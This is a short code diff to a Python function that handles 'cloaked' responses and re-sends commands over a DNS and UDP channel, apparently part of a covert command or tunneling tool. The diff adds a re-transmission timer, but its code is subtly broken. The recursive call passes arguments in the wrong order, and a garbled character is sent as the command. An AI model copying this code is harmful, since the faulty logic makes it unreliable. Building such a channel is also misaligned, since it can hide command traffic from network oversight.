@@ -65,6 +65,15 @@ def receive_response(dns='localhost', local=False, args=None):
     
     decloaked_response = "decloaked_response.txt"
     
+    # Request re-transmission if no response is received within 3 seconds
+    if os.environ.get('EOT') == 'True' or local:
+        def timeout_handler():
+            print("No command received within 3 seconds. Requesting re-transmission.")
+            send_command('�', dns, args)
+            receive_response(local, args)
+        timer = threading.Timer(3.0, timeout_handler)
+        timer.start()
+
     with open(cloaked_response, 'r') as file:
         if file.read().strip() == "":
             print("No response received.")
@@ -87,7 +96,7 @@ def receive_response(dns='localhost', local=False, args=None):
         
 
     # Remove useless file after execution
-    os.remove(cloaked_response)
+    os.remove(cloaked_response) if os.path.exists(cloaked_response) else None
     os.remove(decloaked_response)
     start_udp_server()
 
